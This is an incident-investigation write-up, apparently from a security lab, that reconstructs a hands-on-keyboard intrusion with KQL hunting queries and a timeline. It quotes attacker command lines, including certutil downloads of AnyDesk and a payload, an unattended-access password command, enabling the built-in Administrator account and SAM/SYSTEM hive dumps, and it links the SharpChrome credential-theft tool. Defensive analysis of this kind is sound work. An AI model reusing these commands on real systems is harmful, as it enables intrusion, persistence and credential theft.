
# Alert - Compromised account conducting hands on keyboard attack

<img width="859" height="200" alt="Pasted image 20260225170216" src="https://github.com/user-attachments/assets/202a9d5b-8b5e-48fe-8c7c-a1c9139dbf0f" />

#### Artifacts
**Alert Timestamp:** `Jan 14, 2026 9:08:27.367 PM`
**Devices**: `as-pc1`, `as-pc2`, `as-srv`
**Users**: `Sophie.Turner`, `David Mitchell`
**Malicious file**: Daniel_Richardson_CV.pdf.exe `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`

---

<img width="378" height="135" alt="Pasted image 20260225211152" src="https://github.com/user-attachments/assets/9a414ea5-6462-4604-b5c1-ed6fb0f824ab" />

Explorer.exe spawned file `daniel_richardson_cv.pdf.exe`. 

Initial Execution time at `1/14/26 7:31:53 PM`

---

<img width="1144" height="735" alt="Pasted image 20260225213100" src="https://github.com/user-attachments/assets/066cdd2f-2a35-4440-8a89-321587c66335" />


Malicious PDF.exe leveraged multiple native Windows processes to establish persistence, create a backdoor admin account, and deployed `AnyDesk` for remote access.

---

![[Pasted image 20260225212745.png]]

**Malicious `pdf.exe` additionally spawned an instance of notepad.exe which loaded the CLR module `SharpChrome`

![[Pasted image 20260226130131.png]]

> https://github.com/zzhsec/SharpChrome

![[Pasted image 20260225214048.png]]

**Alerts aligned with the described tool behavior**

---

![[Pasted image 20260226130022.png]]

**Observed attempted defense evasion by clearing event logs via `wevutil.exe` CLI

---
```kql
let lookback = 90d;
DeviceNetworkEvents
| where TimeGenerated >= ago(lookback)
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName contains "anydesk" 
    or InitiatingProcessFileName contains "daniel_richardson"
| project TimeGenerated, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort
| sort by TimeGenerated asc
```
![[Pasted image 20260225215709.png]]

Observed multiple outbound connections initiated from the malicious binary to external domain `cdn[.]cloud[.]endpoint[.]net` with activity beginning at `1/15/26 3:47 AM`

---
```kql
DeviceFileEvents
// | where DeviceName == "as-pc1"
| where FileName contains "daniel_richardson"
| project TimeGenerated, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
```
![[Pasted image 20260225225110.png]]

Observed `certutil` used as a LOLbin to download the pdf.exe payload from `sync.cloud-endpoint.net` at `1/15/26 4:52 AM`

The payload obfuscated as a legitimate windows process `RunTimeBroker` and saved to a world-writeable directory

``certutil.exe -urlcache -split -f``

>Note: This is under `David.Mitchell`'s profile on `as-pc2`, not `Sophie.Turner` indicative of potential lateral movement from additional compromised account

---
```kql
DeviceProcessEvents
| where DeviceName == "as-pc1"
| where ProcessCommandLine contains "reg"
| where InitiatingProcessFileName contains "powershell"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessFileName
```
![[Pasted image 20260225233224.png]]

Attacker leveraged `powershell.exe` to dump `HKLM\SAM` and `HKLM\SYSTEM` registry hives to `C:\Users\Public` for offline credential extraction at `1/15/26 4:13pm`

> Alternative query for a more holistic view 

```kql
DeviceProcessEvents
| where AccountName in ("sophie.turner", "david.mitchel", "as.srv.administrator")
//| where ProcessCommandLine has_any ("psexec", "wmic", "paexec", "winrm", "invoke-command", "enter-pssession", "sc.exe \\")
| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
| project TimeGenerated, AccountName, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by TimeGenerated asc
```
![[Pasted image 20260226142532.png]]

---

![[Pasted image 20260225233952.png]]

Observed commands indicative of host and network reconnaissance

---
```kql
DeviceProcessEvents
| where DeviceName == "as-pc1"
| where ProcessCommandLine contains "Anydesk"
| project AccountName,InitiatingProcessFileName, InitiatingProcessSHA256
```
![[Pasted image 20260225234858.png]]

>`Anydesk SHA256: f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532`

Legitimate remote administration tool `AnyDesk` deployed by the malicious pdf.exe in attempt to establish persistent access

---

![[Pasted image 20260226125031.png]]

`Anydesk` was downloaded using the native windows binary `certutil` at `Jan 14 8:08 PM`

CommandLine:

`cmd.exe /c "certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe"`

---

![[Pasted image 20260226124519.png]]

After installation a configuration file was accessed at `1/14/26 8:11 PM`

`C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`

---

![[Pasted image 20260226125641.png]]

**Unattended access was configured for the remote tool**

`cmd.exe /c "echo intrud3r! | C:\Users\Public\AnyDesk.exe --set-password"`

---
```kql
DeviceFileEvents
| where SHA256 == "f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532"
| sort by TimeGenerated asc 
```
![[Pasted image 20260226130606.png]]

**The remote tool was installed across multiple hosts in the following order indicative of lateral movement**

`as-pc1` >  `as-pc2` > `as-srv`

---
```kql
DeviceProcessEvents
// | where AccountName in ("sophie.turner", "david.mitchel", "as.srv.administrator")
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
| where AccountName !in ("local service", "system")
| project TimeGenerated, AccountName, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by TimeGenerated desc 
```
![[Pasted image 20260226143855.png]]

Observed multiple failed lateral movement attempts with `wmic.exe` and `psexec.exe` with activity beginning at  `1/15/2026, 4:18:44 AM`

---

![[Pasted image 20260226230852.png]]

Observed `sophie.turner;as-pc1` running commands `ARP`, `net view`, and `PING` indicative of additional network reconnaissance**

Following enumeration of live hosts `as-pc2`, and `as-srv`, the attacker attempted RDP (mstsc.exe) to `10[.]1[.]0[.]183` at `1/15/2026, 4:29 AM` and `10[.]1[.]0[.]203` at `1/15/2026, 4:34 AM`

`DeviceNetworkEvents` show the attacker successfully authenticated as `david.mitchell` on `as-pc2` at `1/15/2026, 4:40:31 AM`

![[Pasted image 20260227000458.png]]

The local administrator was then enabled via `net user Administrator /active:yes` with a configured password at `1/15/2026, 4:40 AM`

![[Pasted image 20260226233055.png]]

- `certutil` downloaded and executed `Anydesk` at `1/15/26 4:40 AM`

![[Pasted image 20260226230448.png]]

- `certutil` contacted the attacker domain and download the malicious payload as seen previously on `as-pc1` at `1/15/2026 4:52 AM`
- Payload obfuscated a benign windows process. This behavior mirrors the activity seen on patient-zero confirming lateral movement success.

---

![[Pasted image 20260226233631.png]]

At `1/15/26 4:52 AM` a scheduled task named obfuscated as `MicrosoftEdgeUpdateCheck` was set to execute the attackers malicious binary disguised as a legitimate windows process 

The malicious binary was set to execute daily during off hours at 3 AM with the highest privileges

---
```kql
DeviceProcessEvents
// | where AccountName in ("sophie.turner", "david.mitchel", "as.srv.administrator")
| where DeviceName in ("as-pc1", "as-pc2", "as-srv")
//| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
| where ProcessCommandLine has_any ("net", "user", "/add")
| where AccountName !in ("local service", "system")
| project TimeGenerated, AccountName, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by TimeGenerated desc 
```
![[Pasted image 20260227000704.png]]

The attacker pivoted back to patient-zero and created a new obfuscated local account named `svc_backup` and added it to the `Administrators` group at `1/15/2026, 4:57:47 AM`

---
```kql
DeviceFileEvents
| where InitiatingProcessAccountName in ("sophie.turner", "david.mitchel", "as.srv.administrator")
| where DeviceName == "as-srv"
| where InitiatingProcessFileName != "cleanmgr.exe"
//| where InitiatingProcessFileName in ("certutil", "explorer.exe", "7zg.exe", "powershell.exe", "cmd.exe")
//| where ActionType == "FileModified"
//| project TimeGenerated, DeviceName, ActionType, InitiatingProcessFileName, PreviousFileName, FileName, FileSize, FolderPath
| sort by TimeGenerated desc 
```
![[Pasted image 20260227013254.png]]

`RuntimeBroker.exe` > `Anydesk.exe` > `Shares.7z`

Observed a large archive file `Shares.7z` (194669 bytes) created following the previously seen malicious binaries

---
```kql
DeviceFileEvents
| where DeviceName == "as-srv"
//| where FolderPath contains "shares"
| where FolderPath contains "C:\\Shares"
| project TimeGenerated, ActionType, FileName, FileSize, SHA256
| sort by TimeGenerated desc 
```
![[Pasted image 20260227020434.png]]

Observed multiple file opening and modifications to `BACS_Payments_Dec2025.ods` before archiving all share contents into `Shares.7z` at `1/15/2026 4:59 AM`

---
```kql
DeviceProcessEvents
// | where DeviceName == "as-pc1"
| where DeviceName == "as-pc2"
| where ProcessCommandLine contains "as-srv"
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
| sort by TimeGenerated asc
```
![[Pasted image 20260227015814.png]]

`david.mitchell` on `as-pc2` opened `BACS_Payments_Dec2025.ods` directly from the `AS-SRV` payroll share via LibreOffice at `1/15/2026, 4:53 AM`

---

![[Pasted image 20260227021611.png]]

`SharpChrome` reflectively loaded into `notepad.exe` via CLR, then used DPAPI to decrypt and access stored browser credentials at `1/15/2026, 5:09 AM`

---

## Approximate Attack Timeline

#### **January 14, 2026**

- **7:31:53 PM** – `explorer.exe` spawns `Daniel_Richardson_CV.pdf.exe` on `as-pc1` (Initial execution / patient zero).
    
- **8:08 PM** – `certutil.exe` downloads `AnyDesk.exe` to `C:\Users\Public\AnyDesk.exe` on `as-pc1`.
    
- **8:11 PM** – AnyDesk configuration file accessed:
    
    - `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`
        
- **~8:11 PM** – Unattended access configured:
    
    - `echo intrud3r! | AnyDesk.exe --set-password`
        
- **~Evening (post-execution)** – Malicious binary spawns `notepad.exe` and reflectively loads `SharpChrome` CLR module (browser credential harvesting begins).
    
- **~Evening** – Event logs cleared via `wevtutil.exe` (Security, System, Application logs).
#### **January 15, 2026**

- **3:47 AM** – Outbound connections from malicious binary to:
    
    - `cdn.cloud.endpoint.net` (external C2 activity begins).
        
- **4:13 AM** – PowerShell dumps:
    
    - `HKLM\SAM`
        
    - `HKLM\SYSTEM`
        
    - Registry hives saved to `C:\Users\Public` (credential extraction staging).
        
- **4:18:44 AM** – Multiple failed lateral movement attempts using:
    
    - `wmic.exe`
        
    - `psexec.exe`
        
- **4:29 AM** – RDP attempt (`mstsc.exe`) from `as-pc1` to:
    
    - `10.1.0.183`
        
- **4:34 AM** – RDP attempt to:
    
    - `10.1.0.203`
        
- **4:40:00 AM** – Successful authentication as `david.mitchell` on `as-pc2`.
    
- **4:40 AM** – Built-in Administrator account enabled:
    
    - `net user Administrator /active:yes`
        
- **4:40 AM** – `certutil` downloads and executes `AnyDesk` on `as-pc2`.
    
- **4:52 AM** – `certutil` contacts attacker domain and downloads malicious payload to `as-pc2`:
    
    - Obfuscated as `RuntimeBroker`
        
    - Saved to world-writeable directory
        
- **4:52 AM** – Scheduled task created:
    
    - Name: `MicrosoftEdgeUpdateCheck`
        
    - Executes malicious binary daily at 3 AM
        
    - Runs with highest privileges
        
- **4:53 AM** – `david.mitchell` on `as-pc2` opens:
    
    - `BACS_Payments_Dec2025.ods`
        
    - Directly from `AS-SRV` payroll share (data targeting phase begins)
        
- **4:57:47 AM** – Attacker pivots back to `as-pc1`:
    
    - Creates local account `svc_backup`
        
    - Adds account to `Administrators` group
        
- **4:59 AM** – On `as-srv`:
    
    - Multiple file modifications to `BACS_Payments_Dec2025.ods`
        
    - Share contents archived into `Shares.7z`
        
    - Archive size: 194,669 bytes
        
    - Process chain: `RuntimeBroker.exe` → `AnyDesk.exe` → `Shares.7z`
        
- **5:09 AM** – `SharpChrome` reflectively loaded into `notepad.exe`
    
    - DPAPI decryption performed
        
    - Stored browser credentials accessed
